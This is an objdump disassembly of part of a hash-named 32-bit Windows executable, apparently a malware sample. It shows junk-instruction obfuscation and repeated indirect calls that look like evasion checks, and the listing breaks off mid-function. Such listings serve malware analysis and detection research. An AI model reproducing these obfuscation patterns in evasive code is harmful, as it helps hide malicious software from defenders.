
02fe6cfd1d8c2e88fb8183413d2f14590464e283e2e51c7fef5df672adca7664.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x42d014,0x42a000
  401013:	push   esi
  401014:	movzx  esi,WORD PTR ds:0x429014
  40101b:	sub    DWORD PTR ds:0x42a018,esi
  401021:	mov    esi,DWORD PTR ds:0x42ed49
  401027:	push   0x8
  401029:	push   0x42e545
  40102e:	and    DWORD PTR ds:0x42c010,0x110f
  401038:	call   esi
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42a018,0x6e1c
  401046:	je     0x40105d
  40104c:	adc    DWORD PTR ds:0x42a014,0x429000
  401056:	xor    eax,eax
  401058:	jmp    0x4029a4
  40105d:	push   edi
  40105e:	push   0x42e555
  401063:	xor    edi,edi
  401065:	and    DWORD PTR ds:0x42c004,0x42d018
  40106f:	inc    edi
  401070:	push   edi
  401071:	push   edi
  401072:	call   DWORD PTR ds:0x42ed79
  401078:	xor    DWORD PTR ds:0x42d01c,0x429020
  401082:	test   eax,eax
  401084:	mov    DWORD PTR ds:0x42c004,0x42a7
  40108e:	je     0x4010a5
  401094:	xor    eax,eax
  401096:	mov    DWORD PTR ds:0x42a018,0x32e7
  4010a0:	jmp    0x4029a3
  4010a5:	sbb    DWORD PTR ds:0x42a010,0x2663
  4010af:	push   ebx
  4010b0:	and    DWORD PTR ds:0x42d008,0x0
  4010ba:	mov    ebx,DWORD PTR ds:0x42d008
  4010c0:	inc    ebx
  4010c1:	mov    DWORD PTR ds:0x42d008,ebx
  4010c7:	cmp    DWORD PTR ds:0x42d008,0xb
  4010ce:	jne    0x4010e4
  4010d4:	push   0x2cfb
  4010d9:	push   0x7de9
  4010de:	call   DWORD PTR ds:0x42ed35
  4010e4:	cmp    DWORD PTR ds:0x42d008,0xa
  4010eb:	jne    0x4010fe
  4010f1:	mov    ebx,DWORD PTR ds:0x42d008
  4010f7:	inc    ebx
  4010f8:	mov    DWORD PTR ds:0x42d008,ebx
  4010fe:	cmp    DWORD PTR ds:0x42d008,0x12
  401105:	jb     0x4010ba
  40110b:	mov    ebx,DWORD PTR ds:0x42ed4d
  401111:	push   0x42e565
  401116:	sub    DWORD PTR ds:0x429014,0x429020
  401120:	push   edi
  401121:	mov    DWORD PTR ds:0x42b01c,0x3048
  40112b:	push   edi
  40112c:	call   ebx
  40112e:	and    DWORD PTR ds:0x42c00c,0x5ead
  401138:	test   eax,eax
  40113a:	jne    0x401e1f
  401140:	push   0xc
  401142:	push   0x42e589
  401147:	adc    DWORD PTR ds:0x42c010,0x42d010
  401151:	call   esi
  401153:	test   eax,eax
  401155:	mov    DWORD PTR ds:0x42a01c,0x6b4c
  40115f:	jne    0x401e1f
  401165:	push   0x7
  401167:	push   0x42e59d
  40116c:	call   esi
  40116e:	xor    DWORD PTR ds:0x429028,0x6216
  401178:	test   eax,eax
  40117a:	jne    0x401e1f
  401180:	add    DWORD PTR ds:0x429004,0x14dc
  40118a:	push   0x8
  40118c:	and    DWORD PTR ds:0x42c00c,0x42a000
  401196:	push   0x42e5ad
  40119b:	add    DWORD PTR ds:0x42a018,0x317f
  4011a5:	call   esi
  4011a7:	test   eax,eax
  4011a9:	mov    DWORD PTR ds:0x42c014,0x304b
  4011b3:	jne    0x401e1f
  4011b9:	push   0x42e5bd
  4011be:	xor    DWORD PTR ds:0x42d014,0x42b004
  4011c8:	push   edi
  4011c9:	push   edi
  4011ca:	sub    DWORD PTR ds:0x429010,0x429028
  4011d4:	call   DWORD PTR ds:0x42ed79
  4011da:	not    DWORD PTR ds:0x42b000
  4011e0:	test   eax,eax
  4011e2:	mov    DWORD PTR ds:0x429008,0x4a9f
  4011ec:	jne    0x401e1f
  4011f2:	push   0x42e5cd
  4011f7:	push   edi
  4011f8:	adc    DWORD PTR ds:0x42d000,0x42900c
  401202:	push   edi
  401203:	call   ebx
  401205:	test   eax,eax
  401207:	jne    0x401e1f
  40120d:	xor    DWORD PTR ds:0x429000,0x429010
  401217:	push   0xc
  401219:	and    DWORD PTR ds:0x42b00c,0x6767
  401223:	push   0x42e5f1
  401228:	sub    DWORD PTR ds:0x42a010,0x429018
  401232:	call   esi
  401234:	sub    DWORD PTR ds:0x429010,0x42a010
  40123e:	test   eax,eax
  401240:	jne    0x401e1f
  401246:	push   0x7
  401248:	push   0x42e605
  40124d:	and    DWORD PTR ds:0x42c004,0x42b014
  401257:	call   esi
  401259:	test   eax,eax
  40125b:	mov    DWORD PTR ds:0x42c014,0x7e03
  401265:	jne    0x401e1f
  40126b:	and    DWORD PTR ds:0x429020,0x42d000
  401275:	push   0x8
  401277:	sbb    DWORD PTR ds:0x42a008,0x42901c
  401281:	push   0x42e615
  401286:	add    DWORD PTR ds:0x42c01c,0x42d010
  401290:	call   esi
  401292:	test   eax,eax
  401294:	mov    DWORD PTR ds:0x429008,0x7503
  40129e:	jne    0x401e1f
  4012a4:	push   0x42e625
  4012a9:	and    DWORD PTR ds:0x42d008,0x42c000
  4012b3:	push   edi
  4012b4:	push   edi
  4012b5:	call   DWORD PTR ds:0x42ed79
  4012bb:	or     DWORD PTR ds:0x42c01c,0x42d000
  4012c5:	test   eax,eax
  4012c7:	jne    0x401e1f
  4012cd:	add    DWORD PTR ds:0x42b018,0x42d004
  4012d7:	push   0x42e635
  4012dc:	and    DWORD PTR ds:0x42900c,0x42a018
  4012e6:	push   edi
  4012e7:	push   edi
  4012e8:	and    DWORD PTR ds:0x42c018,0x4f5c
  4012f2:	call   ebx
  4012f4:	xor    DWORD PTR ds:0x42b00c,0x577f
  4012fe:	test   eax,eax
  401300:	jne    0x401e1f
  401306:	push   0xc
  401308:	push   0x42e659
  40130d:	xor    DWORD PTR ds:0x429018,0x2dc5
  401317:	call   esi
  401319:	mov    DWORD PTR ds:0x42d014,0x790c
  401323:	test   eax,eax
  401325:	mov    DWORD PTR ds:0x42a014,0x2892
  40132f:	jne    0x401e1f
  401335:	sub    DWORD PTR ds:0x42d004,0x3ee1
  40133f:	push   0x7
  401341:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40134b:	push   0x42e66d
  401350:	and    DWORD PTR ds:0x42c018,0x42d014
  40135a:	call   esi
  40135c:	test   eax,eax
  40135e:	mov    DWORD PTR ds:0x429008,0x4095
  401368:	jne    0x401e1f
  40136e:	sub    DWORD PTR ds:0x42d008,0x42b000
  401378:	push   0x8
  40137a:	adc    DWORD PTR ds:0x42d018,0x42c00c
  401384:	push   0x42e67d
  401389:	xor    DWORD PTR ds:0x42c014,0x7b1e
  401393:	call   esi
  401395:	test   eax,eax
  401397:	mov    DWORD PTR ds:0x42c010,0x4421
  4013a1:	jne    0x401e1f
  4013a7:	push   0x42e68d
  4013ac:	xor    DWORD PTR ds:0x42d018,0x31e9
  4013b6:	push   edi
  4013b7:	push   edi
  4013b8:	dec    DWORD PTR ds:0x42b010
  4013be:	call   DWORD PTR ds:0x42ed79
  4013c4:	test   eax,eax
  4013c6:	mov    DWORD PTR ds:0x429008,0x30d5
  4013d0:	jne    0x401e1f
  4013d6:	push   0x42e69d
  4013db:	push   edi
  4013dc:	adc    DWORD PTR ds:0x42c018,0x42d014
  4013e6:	push   edi
  4013e7:	sbb    DWORD PTR ds:0x429024,0x42b00c
  4013f1:	call   ebx
  4013f3:	xor    DWORD PTR ds:0x42b004,0x3165
  4013fd:	test   eax,eax
  4013ff:	mov    DWORD PTR ds:0x429028,0x3c76
  401409:	jne    0x401e1f
  40140f:	push   0xc
  401411:	or     DWORD PTR ds:0x42d000,0x42c004
  40141b:	push   0x42e6c1
  401420:	call   esi
  401422:	test   eax,eax
  401424:	mov    DWORD PTR ds:0x42d01c,0x6bbc
  40142e:	jne    0x401e1f
  401434:	and    DWORD PTR ds:0x42c018,0x24ff
  40143e:	push   0x7
  401440:	push   0x42e6d5
  401445:	add    DWORD PTR ds:0x42c008,0x429024
  40144f:	call   esi
  401451:	adc    DWORD PTR ds:0x429008,0x42b004
  40145b:	test   eax,eax
  40145d:	jne    0x401e1f
  401463:	push   0x8
  401465:	push   0x42e6e5
  40146a:	or     DWORD PTR ds:0x42a00c,0x2f15
  401474:	call   esi
  401476:	test   eax,eax
  401478:	jne    0x401e1f
  40147e:	push   0x42e6f5
  401483:	push   edi
  401484:	add    DWORD PTR ds:0x42a008,0x52fe
  40148e:	push   edi
  40148f:	call   DWORD PTR ds:0x42ed79
  401495:	sub    DWORD PTR ds:0x429018,0x42c010
  40149f:	test   eax,eax
  4014a1:	mov    DWORD PTR ds:0x42d014,0x5fc2
  4014ab:	jne    0x401e1f
  4014b1:	push   0x42e705
  4014b6:	add    DWORD PTR ds:0x42b014,0x42a00c
  4014c0:	push   edi
  4014c1:	push   edi
  4014c2:	xor    DWORD PTR ds:0x42b00c,0x37e4
  4014cc:	call   ebx
  4014ce:	mov    DWORD PTR ds:0x429000,0x2bcb
  4014d8:	test   eax,eax
  4014da:	jne    0x401e1f
  4014e0:	push   0xc
  4014e2:	push   0x42e729
  4014e7:	call   esi
  4014e9:	and    DWORD PTR ds:0x42b000,0x6be4
  4014f3:	test   eax,eax
  4014f5:	mov    DWORD PTR ds:0x42b00c,0x4954
  4014ff:	jne    0x401e1f
  401505:	or     DWORD PTR ds:0x429004,0x2e1b
  40150f:	push   0x7
  401511:	push   0x42e73d
  401516:	neg    DWORD PTR ds:0x429018
  40151c:	call   esi
  40151e:	or     DWORD PTR ds:0x429004,0x7cc8
  401528:	test   eax,eax
  40152a:	mov    DWORD PTR ds:0x42a000,0x4af4
  401534:	jne    0x401e1f
  40153a:	sub    DWORD PTR ds:0x429020,0x6067
  401544:	push   0x8
  401546:	push   0x42e74d
  40154b:	call   esi
  40154d:	test   eax,eax
  40154f:	jne    0x401e1f
  401555:	xor    DWORD PTR ds:0x429008,0x42a00c
  40155f:	push   0x42e75d
  401564:	push   edi
  401565:	sbb    DWORD PTR ds:0x42a004,0x429028
  40156f:	push   edi
  401570:	adc    DWORD PTR ds:0x42c000,0x42b004
  40157a:	call   DWORD PTR ds:0x42ed79
  401580:	xor    DWORD PTR ds:0x42b01c,0x42d004
  40158a:	test   eax,eax
  40158c:	mov    DWORD PTR ds:0x429004,0x6f0c
  401596:	jne    0x401e1f
  40159c:	sbb    DWORD PTR ds:0x429010,0x42b010
  4015a6:	push   0x42e76d
  4015ab:	push   edi
  4015ac:	xor    DWORD PTR ds:0x42c000,0x17e1
  4015b6:	push   edi
  4015b7:	add    DWORD PTR ds:0x429024,0x42b018
  4015c1:	call   ebx
  4015c3:	sbb    DWORD PTR ds:0x42c004,0x42b018
  4015cd:	test   eax,eax
  4015cf:	jne    0x401e1f
  4015d5:	or     DWORD PTR ds:0x42d008,0x42d000
  4015df:	push   0xc
  4015e1:	push   0x42e791
  4015e6:	adc    DWORD PTR ds:0x42d01c,0x429000
  4015f0:	call   esi
  4015f2:	test   eax,eax
  4015f4:	jne    0x401e1f
  4015fa:	sbb    DWORD PTR ds:0x42b01c,0x35f4
  401604:	push   0x7
  401606:	adc    DWORD PTR ds:0x42d00c,0x4213
  401610:	push   0x42e7a5
  401615:	xor    DWORD PTR ds:0x42b01c,0x728b
  40161f:	call   esi
  401621:	test   eax,eax
  401623:	mov    DWORD PTR ds:0x429010,0x1355
  40162d:	jne    0x401e1f
  401633:	add    DWORD PTR ds:0x42c00c,0x42d000
  40163d:	push   0x8
  40163f:	sub    DWORD PTR ds:0x42d000,0x42a014
  401649:	push   0x42e7b5
  40164e:	xor    DWORD PTR ds:0x42900c,0x42a014
  401658:	call   esi
  40165a:	add    DWORD PTR ds:0x42d018,0x7270
  401664:	test   eax,eax
  401666:	jne    0x401e1f
  40166c:	xor    DWORD PTR ds:0x429028,0x318
  401676:	push   0x42e7c5
  40167b:	not    DWORD PTR ds:0x42b00c
  401681:	push   edi
  401682:	and    DWORD PTR ds:0x429024,0x42d004
  40168c:	push   edi
  40168d:	call   DWORD PTR ds:0x42ed79
  401693:	test   eax,eax
  401695:	jne    0x401e1f
  40169b:	push   0x42e7d5
  4016a0:	push   edi
  4016a1:	push   edi
  4016a2:	xor    DWORD PTR ds:0x42d004,0x42b004
  4016ac:	call   ebx
  4016ae:	sbb    DWORD PTR ds:0x42d01c,0x42a008
  4016b8:	test   eax,eax
  4016ba:	mov    DWORD PTR ds:0x42b008,0x59c6
  4016c4:	jne    0x401e1f
  4016ca:	mov    DWORD PTR ds:0x42a008,0x78fc
  4016d4:	push   0xc
  4016d6:	add    DWORD PTR ds:0x42900c,0x42c018
  4016e0:	push   0x42e7f9
  4016e5:	call   esi
  4016e7:	test   eax,eax
  4016e9:	jne    0x401e1f
  4016ef:	and    DWORD PTR ds:0x42d010,0x3029
  4016f9:	push   0x7
  4016fb:	xor    DWORD PTR ds:0x42d008,0x429020
  401705:	push   0x42e80d
  40170a:	call   esi
  40170c:	sub    DWORD PTR ds:0x42901c,0x49cd
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42900c,0x2477
  401722:	jne    0x401e1f
  401728:	push   0x8
  40172a:	push   0x42e81d
  40172f:	call   esi
  401731:	or     DWORD PTR ds:0x42c000,0x42b014
  40173b:	test   eax,eax
  40173d:	jne    0x401e1f
  401743:	sub    DWORD PTR ds:0x429018,0x4202
  40174d:	push   0x42e82d
  401752:	adc    DWORD PTR ds:0x42a000,0x15e
  40175c:	push   edi
  40175d:	push   edi
  40175e:	and    DWORD PTR ds:0x42d008,0x1b79
  401768:	call   DWORD PTR ds:0x42ed79
  40176e:	add    DWORD PTR ds:0x42b008,0x42c000
  401778:	test   eax,eax
  40177a:	mov    DWORD PTR ds:0x429004,0x4fab
  401784:	jne    0x401e1f
  40178a:	add    DWORD PTR ds:0x42b008,0x429018
  401794:	push   0x42e83d
  401799:	push   edi
  40179a:	adc    DWORD PTR ds:0x42d018,0x42b008
  4017a4:	push   edi
  4017a5:	call   ebx
  4017a7:	adc    DWORD PTR ds:0x42b01c,0x42a014
  4017b1:	test   eax,eax
  4017b3:	mov    DWORD PTR ds:0x42b008,0x413c
  4017bd:	jne    0x401e1f
  4017c3:	sub    DWORD PTR ds:0x42a004,0x429004
  4017cd:	push   0xc
  4017cf:	push   0x42e861
  4017d4:	sub    DWORD PTR ds:0x42b014,0x419d
  4017de:	call   esi
  4017e0:	sub    DWORD PTR ds:0x429014,0x429024
  4017ea:	test   eax,eax
  4017ec:	mov    DWORD PTR ds:0x42c018,0x3584
  4017f6:	jne    0x401e1f
  4017fc:	adc    DWORD PTR ds:0x42b014,0x3845
  401806:	push   0x7
  401808:	adc    DWORD PTR ds:0x42b014,0x5918
  401812:	push   0x42e875
  401817:	call   esi
  401819:	or     DWORD PTR ds:0x42b004,0x42a000
  401823:	test   eax,eax
  401825:	jne    0x401e1f
  40182b:	sub    DWORD PTR ds:0x42c010,0x7a9b
  401835:	push   0x8
  401837:	push   0x42e885
  40183c:	call   esi
  40183e:	or     DWORD PTR ds:0x42b018,0x42a018
  401848:	test   eax,eax
  40184a:	mov    DWORD PTR ds:0x42c018,0x6db6
  401854:	jne    0x401e1f
  40185a:	push   0x42e895
  40185f:	push   edi
  401860:	push   edi
  401861:	or     DWORD PTR ds:0x429024,0x42b004
  40186b:	call   DWORD PTR ds:0x42ed79
  401871:	test   eax,eax
  401873:	jne    0x401e1f
  401879:	push   0x42e8a5
  40187e:	mov    DWORD PTR ds:0x42d010,0x708e
  401888:	push   edi
  401889:	mov    DWORD PTR ds:0x42c01c,0x7ef
  401893:	push   edi
  401894:	call   ebx
  401896:	test   eax,eax
  401898:	mov    DWORD PTR ds:0x42a00c,0x3b87
  4018a2:	jne    0x401e1f
  4018a8:	mov    DWORD PTR ds:0x429004,0x503
  4018b2:	push   0xc
  4018b4:	xor    DWORD PTR ds:0x42c00c,0x6b3b
  4018be:	push   0x42e8c9
  4018c3:	call   esi
  4018c5:	test   eax,eax
  4018c7:	mov    DWORD PTR ds:0x42a004,0x812
  4018d1:	jne    0x401e1f
  4018d7:	push   0x7
  4018d9:	sub    DWORD PTR ds:0x42b000,0x42a00c
  4018e3:	push   0x42e8dd
  4018e8:	sub    DWORD PTR ds:0x42d008,0x6a91
  4018f2:	call   esi
  4018f4:	add    DWORD PTR ds:0x429000,0x3ce6
  4018fe:	test   eax,eax
  401900:	mov    DWORD PTR ds:0x42d018,0x1a2
  40190a:	jne    0x401e1f
  401910:	sub    DWORD PTR ds:0x42a008,0x42a010
  40191a:	push   0x8
  40191c:	push   0x42e8ed
  401921:	call   esi
  401923:	sub    DWORD PTR ds:0x42d00c,0x42900c
  40192d:	test   eax,eax
  40192f:	mov    DWORD PTR ds:0x429000,0x18ec
  401939:	jne    0x401e1f
  40193f:	sbb    DWORD PTR ds:0x42a01c,0x42a004
  401949:	push   0x42e8fd
  40194e:	adc    DWORD PTR ds:0x42c010,0x1027
  401958:	push   edi
  401959:	adc    DWORD PTR ds:0x42d014,0x61c0
  401963:	push   edi
  401964:	xor    DWORD PTR ds:0x42d004,0x42b000
  40196e:	call   DWORD PTR ds:0x42ed79
  401974:	and    DWORD PTR ds:0x42b00c,0x54e0
  40197e:	test   eax,eax
  401980:	jne    0x401e1f
  401986:	mov    DWORD PTR ds:0x42b014,0x48d
  401990:	push   0x42e90d
  401995:	xor    DWORD PTR ds:0x42b00c,0x429000
  40199f:	push   edi
  4019a0:	xor    DWORD PTR ds:0x42c008,0x7d0d
  4019aa:	push   edi
  4019ab:	and    DWORD PTR ds:0x42b010,0xad4
  4019b5:	call   ebx
  4019b7:	adc    DWORD PTR ds:0x42b01c,0x42d018
  4019c1:	test   eax,eax
  4019c3:	mov    DWORD PTR ds:0x42a00c,0x2f29
  4019cd:	jne    0x401e1f
  4019d3:	sub    DWORD PTR ds:0x42a010,0x429014
  4019dd:	push   0xc
  4019df:	add    DWORD PTR ds:0x42d004,0x38f3
  4019e9:	push   0x42e931
  4019ee:	sub    DWORD PTR ds:0x42d008,0x531f
  4019f8:	call   esi
  4019fa:	xor    DWORD PTR ds:0x42a00c,0x1332
  401a04:	test   eax,eax
  401a06:	jne    0x401e1f
  401a0c:	add    DWORD PTR ds:0x42d014,0x42b000
  401a16:	push   0x7
  401a18:	push   0x42e945
  401a1d:	adc    DWORD PTR ds:0x429028,0x23cf
  401a27:	call   esi
  401a29:	test   eax,eax
  401a2b:	jne    0x401e1f
  401a31:	push   0x8
  401a33:	add    DWORD PTR ds:0x429020,0x607a
  401a3d:	push   0x42e955
  401a42:	call   esi
  401a44:	or     DWORD PTR ds:0x42c000,0x42b00c
  401a4e:	test   eax,eax
  401a50:	mov    DWORD PTR ds:0x42c00c,0x4ca0
  401a5a:	jne    0x401e1f
  401a60:	sub    DWORD PTR ds:0x429000,0x42d010
  401a6a:	push   0x42e965
  401a6f:	push   edi
  401a70:	and    DWORD PTR ds:0x42901c,0x42a004
  401a7a:	push   edi
  401a7b:	xor    DWORD PTR ds:0x42b018,0x42a008
  401a85:	call   DWORD PTR ds:0x42ed79
  401a8b:	adc    DWORD PTR ds:0x42d004,0x42901c
  401a95:	test   eax,eax
  401a97:	mov    DWORD PTR ds:0x42c010,0x64f7
  401aa1:	jne    0x401e1f
  401aa7:	push   0x42e975
  401aac:	mov    DWORD PTR ds:0x42a014,0x62f7
  401ab6:	push   edi
  401ab7:	push   edi
  401ab8:	call   ebx
  401aba:	add    DWORD PTR ds:0x42a018,0x42d01c
  401ac4:	test   eax,eax
  401ac6:	mov    DWORD PTR ds:0x42c01c,0x72ca
  401ad0:	jne    0x401e1f
  401ad6:	mov    DWORD PTR ds:0x42c01c,0x7760
  401ae0:	push   0xc
  401ae2:	sub    DWORD PTR ds:0x42b018,0x3ed8
  401aec:	push   0x42e999
  401af1:	call   esi
  401af3:	test   eax,eax
  401af5:	mov    DWORD PTR ds:0x42d018,0x4329
  401aff:	jne    0x401e1f
  401b05:	push   0x7
  401b07:	push   0x42e9ad
  401b0c:	call   esi
  401b0e:	add    DWORD PTR ds:0x42b01c,0x42d008
  401b18:	test   eax,eax
  401b1a:	jne    0x401e1f
  401b20:	add    DWORD PTR ds:0x42a008,0x5e0b
  401b2a:	push   0x8
  401b2c:	sub    DWORD PTR ds:0x429018,0x42a00c
  401b36:	push   0x42e9bd
  401b3b:	call   esi
  401b3d:	test   eax,eax
  401b3f:	mov    DWORD PTR ds:0x42d008,0x514f
  401b49:	jne    0x401e1f
  401b4f:	sbb    DWORD PTR ds:0x42b000,0x42d000
  401b59:	push   0x42e9cd
  401b5e:	xor    DWORD PTR ds:0x42c018,0x40e4
  401b68:	push   edi
  401b69:	add    DWORD PTR ds:0x42b010,0x42c000
  401b73:	push   edi
  401b74:	add    DWORD PTR ds:0x42d004,0x42c010
  401b7e:	call   DWORD PTR ds:0x42ed79
  401b84:	mov    DWORD PTR ds:0x42a000,0x51c5
  401b8e:	test   eax,eax
  401b90:	mov    DWORD PTR ds:0x42b000,0x17c8
  401b9a:	jne    0x401e1f
  401ba0:	and    DWORD PTR ds:0x42d014,0x42d010
  401baa:	push   0x42e9dd
  401baf:	push   edi
  401bb0:	push   edi
  401bb1:	call   ebx
  401bb3:	sbb    DWORD PTR ds:0x429010,0x42b014
  401bbd:	test   eax,eax
  401bbf:	mov    DWORD PTR ds:0x42c01c,0x73a3
  401bc9:	jne    0x401e1f
  401bcf:	xor    DWORD PTR ds:0x42c01c,0x6e0
  401bd9:	push   0xc
  401bdb:	adc    DWORD PTR ds:0x429008,0x42c008
  401be5:	push   0x42ea01
  401bea:	adc    DWORD PTR ds:0x42901c,0x2688
  401bf4:	call   esi
  401bf6:	add    DWORD PTR ds:0x42c008,0x63eb
  401c00:	test   eax,eax
  401c02:	mov    DWORD PTR ds:0x429004,0x7742
  401c0c:	jne    0x401e1f
  401c12:	adc    DWORD PTR ds:0x42c014,0x42b008
  401c1c:	push   0x7
  401c1e:	adc    DWORD PTR ds:0x42c008,0x42b010
  401c28:	push   0x42ea15
  401c2d:	call   esi
  401c2f:	test   eax,eax
  401c31:	mov    DWORD PTR ds:0x42900c,0x5c79
  401c3b:	jne    0x401e1f
  401c41:	adc    DWORD PTR ds:0x42d008,0x429000
  401c4b:	push   0x8
  401c4d:	xor    DWORD PTR ds:0x42c008,0x42b014
  401c57:	push   0x42ea25
  401c5c:	sub    DWORD PTR ds:0x42d000,0x42b01c
  401c66:	call   esi
  401c68:	xor    DWORD PTR ds:0x429008,0x42a00c
  401c72:	test   eax,eax
  401c74:	jne    0x401e1f
  401c7a:	push   0x42ea35
  401c7f:	adc    DWORD PTR ds:0x429020,0x1586
  401c89:	push   edi
  401c8a:	push   edi
  401c8b:	and    DWORD PTR ds:0x429008,0x42a014
  401c95:	call   DWORD PTR ds:0x42ed79
  401c9b:	and    DWORD PTR ds:0x42a01c,0x429000
  401ca5:	test   eax,eax
  401ca7:	jne    0x401e1f
  401cad:	push   0x42ea45
  401cb2:	push   edi
  401cb3:	sub    DWORD PTR ds:0x42d000,0x429000
  401cbd:	push   edi
  401cbe:	call   ebx
  401cc0:	test   eax,eax
  401cc2:	jne    0x401e1f
  401cc8:	push   0xc
  401cca:	push   0x42ea69
  401ccf:	sbb    DWORD PTR ds:0x42a004,0x42a014
  401cd9:	call   esi
  401cdb:	test   eax,eax
  401cdd:	mov    DWORD PTR ds:0x42a018,0x57a5
  401ce7:	jne    0x401e1f
  401ced:	sub    DWORD PTR ds:0x42d018,0x45f
  401cf7:	push   0x7
  401cf9:	push   0x42ea7d
  401cfe:	call   esi
  401d00:	test   eax,eax
  401d02:	mov    DWORD PTR ds:0x42a010,0x77f7
  401d0c:	jne    0x401e1f
  401d12:	adc    DWORD PTR ds:0x42a008,0x42900c
  401d1c:	push   0x8
  401d1e:	sub    DWORD PTR ds:0x429008,0x429014
  401d28:	push   0x42ea8d
  401d2d:	and    DWORD PTR ds:0x429008,0x429018
  401d37:	call   esi
  401d39:	test   eax,eax
  401d3b:	mov    DWORD PTR ds:0x429000,0x2cbb
  401d45:	jne    0x401e1f
  401d4b:	and    DWORD PTR ds:0x42d01c,0x42b000
  401d55:	push   0x42ea9d
  401d5a:	or     DWORD PTR ds:0x42b010,0x58c8
  401d64:	push   edi
  401d65:	or     DWORD PTR ds:0x42c00c,0x42a00c
  401d6f:	push   edi
  401d70:	adc    DWORD PTR ds:0x42b004,0x42a01c
  401d7a:	call   DWORD PTR ds:0x42ed79
  401d80:	and    DWORD PTR ds:0x429020,0x42b000
  401d8a:	test   eax,eax
  401d8c:	jne    0x401e1f
  401d92:	or     DWORD PTR ds:0x42c01c,0x42b01c
  401d9c:	push   0x42eaad
  401da1:	push   edi
  401da2:	push   edi
  401da3:	call   ebx
  401da5:	sbb    DWORD PTR ds:0x42901c,0x42c01c
  401daf:	test   eax,eax
  401db1:	mov    DWORD PTR ds:0x429018,0x129d
  401dbb:	jne    0x401e1f
  401dc1:	sbb    DWORD PTR ds:0x42a004,0x14a1
  401dcb:	push   0xc
  401dcd:	push   0x42ead1
  401dd2:	call   esi
  401dd4:	sbb    DWORD PTR ds:0x42c00c,0x67e3
  401dde:	test   eax,eax
  401de0:	mov    DWORD PTR ds:0x42c014,0x5d4a
  401dea:	jne    0x401e1f
  401df0:	sbb    DWORD PTR ds:0x42c00c,0x7769
  401dfa:	push   0x7
  401dfc:	or     DWORD PTR ds:0x42b00c,0x1035
  401e06:	push   0x42eae5
  401e0b:	call   esi
  401e0d:	test   eax,eax
  401e0f:	mov    DWORD PTR ds:0x42d014,0xf4
  401e19:	je     0x401e3a
  401e1f:	sub    DWORD PTR ds:0x42b01c,0x42b000
  401e29:	xor    eax,eax
  401e2b:	mov    DWORD PTR ds:0x42c018,0x7f86
  401e35:	jmp    0x4029a2
  401e3a:	or     esi,DWORD PTR ds:0x429020
  401e40:	mov    DWORD PTR [ebp-0x10],0x0
  401e47:	movzx  esi,BYTE PTR ds:0x42d010
  401e4e:	add    DWORD PTR ds:0x42c004,esi
  401e54:	mov    eax,DWORD PTR [ebp-0x24]
  401e57:	dec    esi
  401e58:	mov    DWORD PTR [ebp-0x24],eax
  401e5b:	mov    ecx,0xf89c85b5
  401e60:	mov    edi,DWORD PTR ds:0x411fc4
  401e66:	mov    esi,DWORD PTR ds:0x411f58
  401e6c:	sub    esi,edi
  401e6e:	imul   edi,DWORD PTR [edi+esi*1]
  401e72:	mov    DWORD PTR [ebp-0x8],ecx
  401e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  401e7c:	and    DWORD PTR ds:0x42a004,0x0
  401e86:	jmp    0x401e98
  401e8b:	mov    edi,DWORD PTR ds:0x42a004
  401e91:	inc    edi
  401e92:	mov    DWORD PTR ds:0x42a004,edi
  401e98:	cmp    DWORD PTR ds:0x42a004,0x1c
  401e9f:	jae    0x401ed2
  401ea5:	cmp    DWORD PTR ds:0x42a004,0x25
  401eac:	jne    0x401ec3
  401eb2:	push   DWORD PTR [ebp-0x14]
  401eb5:	push   0x42a004
  401eba:	push   DWORD PTR [ebp-0x1c]
  401ebd:	call   DWORD PTR ds:0x42ed39
  401ec3:	jmp    0x401e8b
  401ec8:	sbb    DWORD PTR ds:0x42d000,0x3f97
  401ed2:	lea    eax,[ebp-0x34]
  401ed5:	mov    DWORD PTR [ebp-0x28],eax
  401ed8:	mov    esi,DWORD PTR ds:0x429018
  401ede:	and    esi,DWORD PTR ds:0x42901c
  401ee4:	mov    DWORD PTR ds:0x429018,esi
  401eea:	lea    eax,[ebp-0x30]
  401eed:	mov    DWORD PTR [ebp-0x1c],eax
  401ef0:	sub    DWORD PTR ds:0x429018,0x2a07
  401efa:	mov    eax,ds:0x42e435
  401eff:	mov    eax,DWORD PTR [eax+0x1c8]
  401f05:	or     DWORD PTR ds:0x429028,0x42b010
  401f0f:	mov    eax,DWORD PTR [eax]
  401f11:	mov    edx,DWORD PTR [ebp-0x1c]
  401f14:	mov    esi,0x7510896
  401f19:	adc    DWORD PTR ds:0x429014,edi
  401f1f:	xor    eax,esi
  401f21:	mov    edi,0x3272dd
  401f26:	add    eax,edi
  401f28:	mov    DWORD PTR ds:0x42d008,0xdc
  401f32:	mov    DWORD PTR [edx],eax
  401f34:	mov    eax,ds:0x42b000
  401f39:	mov    eax,ds:0x42ebcd
  401f3e:	cmp    eax,0x312bc9f6
  401f43:	jne    0x40206d
  401f49:	xor    eax,0x6ec6
  401f4e:	mov    eax,DWORD PTR [ebp-0x8]
  401f51:	mov    edx,DWORD PTR ds:0x42e435
  401f57:	or     DWORD PTR ds:0x42901c,0x3e24
  401f61:	mov    edx,DWORD PTR [edx+0x198]
  401f67:	or     DWORD PTR ds:0x42b018,edx
  401f6d:	xor    eax,esi
  401f6f:	and    ebx,0x7b5c
  401f75:	add    eax,edi
  401f77:	and    DWORD PTR ds:0x429028,0x0
  401f81:	jmp    0x401f93
  401f86:	mov    ebx,DWORD PTR ds:0x429028
  401f8c:	inc    ebx
  401f8d:	mov    DWORD PTR ds:0x429028,ebx
  401f93:	cmp    DWORD PTR ds:0x429028,0x10
  401f9a:	jae    0x401fc8
  401fa0:	cmp    DWORD PTR ds:0x429028,0x12
  401fa7:	jne    0x401fbd
  401fad:	push   0x42e010
  401fb2:	push   0x42e0c5
  401fb7:	call   DWORD PTR ds:0x42ed3d
  401fbd:	jmp    0x401f86
  401fc2:	sub    DWORD PTR ds:0x42c014,edx
  401fc8:	mov    DWORD PTR [edx],eax
  401fca:	sbb    DWORD PTR ds:0x42c014,edi
  401fd0:	mov    eax,DWORD PTR [ebp-0x8]
  401fd3:	mov    DWORD PTR ds:0x42c018,0x1d
  401fdd:	cmp    DWORD PTR ds:0x42c018,0x0
  401fe4:	je     0x402064
